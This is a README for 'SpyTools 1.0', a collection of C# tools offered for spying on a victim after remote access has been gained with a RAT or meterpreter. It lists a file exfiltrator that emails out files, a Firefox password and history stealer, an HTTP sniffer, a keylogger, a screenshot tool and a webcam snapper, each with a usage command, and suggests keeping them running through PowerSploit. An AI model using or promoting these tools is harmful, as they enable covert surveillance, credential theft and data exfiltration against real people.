# SpyTools 1.0
<br/>
SpyTools is a collection of little tools wirtten in C# .Net 2.0, usefull to spy a vectim. If you got remote access, with a RAT or meterpreter, you can upload this tools to the victim machine, and run them, or persist them using Porwersploit. It is distributed under the GNU GPLv3 license.
<br/>
<br/>
List of tools:
<br/>
EmailSender: get all files with some extensions in the current path, and send an email attaching them.
<br/>
Usage: EmailSender.exe "server.com" "user@server.com" "password" "from@domain.com" "FromName" "to@domain.com" "Subject" "Body" "jpg,txt,png"
<br/>
<br/>
FoxyStealer: copy to the current path, all firefox database and conifg files, for each profile. You can get the history or the passwords saved form them.
<br/>
Usage: FoxyStealer.exe
<br/>
<br/>
HTTPSniffer: Start to capture all HTTP traffic, and flush them into a txt file.
<br/>
Usage: HTTPSniffer.exe ["OutputFileName" NumericIntervalToFlushTrafficToDisk]
<br/>
<br/>
Keylogger: Start to capture all keys, and flush them into a file.
<br/>
Usage: Keylogger.exe ["OutputFileName" NumericIntervalToFlushKeysToDisk]
<br/>
<br/>
Printscreen: Take a screenshot.
<br/>
Usage: Printscreen.exe ["OutputFileName"]
<br/>
<br/>
WebcamSnap: Take a picture from the webcam.
<br/>
Usage: WebcamSnap.exe ["OutputFileName"]